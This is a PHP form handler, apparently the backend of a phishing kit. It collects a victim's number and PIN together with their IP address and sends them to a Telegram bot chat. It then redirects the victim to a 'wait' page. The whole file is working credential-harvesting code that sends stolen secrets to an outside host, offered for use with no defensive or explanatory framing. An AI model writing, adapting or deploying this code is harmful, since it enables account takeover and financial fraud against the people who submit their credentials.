<?php
// Cargar configuración desde config.php
$config = include('config.php');
$botToken = $config['botToken'];
$chatId = $config['chatId'];

// Verifica si el formulario fue enviado
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Captura los datos del formulario
    $numero = htmlspecialchars($_POST['numero']);
    $pin = htmlspecialchars($_POST['pin']);

    // Obtener la IP del usuario
    $ipUsuario = $_SERVER['REMOTE_ADDR'];

    // Construir el mensaje para Telegram
    $mensaje = "📲 *Nuevo Acceso:*\n\n";
    $mensaje .= "🔢 Número: `$numero`\n"; 
    $mensaje .= "🔐 PIN: `$pin`\n";       
    $mensaje .= "🌍 IP: `$ipUsuario`\n"; 

    // Configura la URL de la API de Telegram
    $url = "https://api.telegram.org/bot$botToken/sendMessage";

    // Configura los parámetros a enviar
    $data = [
        'chat_id' => $chatId,
        'text' => $mensaje,
        'parse_mode' => 'Markdown' // Para formato de texto enriquecido
    ];

    // Usa cURL para enviar los datos a Telegram
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);

    // Manejo de errores
    if (curl_errno($ch)) {
        echo "Error al enviar: " . curl_error($ch);
    }

    curl_close($ch);

    // Redirige al usuario a una página específica
    header("Location: espere.php"); // Cambia "gracias.html" por la URL de tu página de redirección
    exit();
} else {
    echo "Método no permitido.";
}
